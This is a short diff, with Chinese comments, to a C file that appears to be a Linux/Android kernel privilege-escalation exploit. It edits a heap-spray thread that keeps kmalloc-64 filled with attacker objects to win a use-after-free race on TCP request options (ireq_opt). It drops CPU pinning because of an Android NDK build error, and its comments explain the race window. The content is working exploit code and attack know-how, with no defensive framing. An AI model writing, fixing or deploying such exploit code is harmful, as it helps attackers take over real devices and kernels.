@@ -533,20 +533,13 @@ static void key_spray_free(void) {
  * 地“关掉一批 → 重新分配一批”，让 kmalloc-64 一直有我们的对象进出。 */
 static void *spray_worker(void *arg) {
     (void)arg;
-    /* 把喷淋线程钉到最后一个 CPU 核。
+    /* 这里本来想绑核，但 pthread_setaffinity_np 和 sched_setaffinity
+     * 都要 _GNU_SOURCE 下的 cpu_set_t，Android NDK 在 CI 上不声明前者，
+     * ISO C99 不允许隐式声明，直接编译失败，所以拿掉了。
      *
-     * UAF 的窗口是「重传定时器在软中断上下文读 ireq_opt」与「ACK 路径
-     * 把它交给子 socket 并置空」这两件事同时发生。前者跑在收包那个核的
-     * 软中断里，后者跑在我们发 ACK 的核上 —— 只有真的分在两个核上，
-     * 才有机会重叠。喷淋线程单独占一个核，主线程和软中断在别的核上，
-     * 三者互不抢占，时序最干净。 */
-    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
-    if (ncpu > 1) {
-        cpu_set_t set;
-        CPU_ZERO(&set);
-        CPU_SET(ncpu - 1, &set);
-        pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
-    }
+     * 不绑也能工作：跨核靠的是「重传定时器跑在软中断上下文」这个事实，
+     * 和我们在哪个核上喷无关。喷淋线程纯用户态、几乎不让出 CPU，
+     * 调度器自然会把它排到空闲核上。 */
     while (g_spray_run) {
         uint32_t gen = ++g_spray_gen;
         if (g_spray_kind == SPRAY_KEY) {
